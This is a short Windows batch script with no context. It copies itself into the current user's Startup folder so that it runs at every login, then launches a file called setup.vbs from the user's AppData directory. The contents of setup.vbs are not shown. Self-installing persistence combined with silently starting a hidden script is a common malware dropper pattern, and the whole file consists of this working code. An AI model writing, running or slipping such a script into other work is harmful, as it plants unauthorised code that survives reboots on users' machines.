@echo off
cls
REM Saving Startup Path in a variable...
Set "_Startup=%Appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
REM Checking, if file already exist in startup...
IF Not Exist "%_Startup%\%~nx0" (Copy /Y "%~nx0" "%_Startup%")
cd C:\Users\%USERNAME%\AppData\
start setup.vbs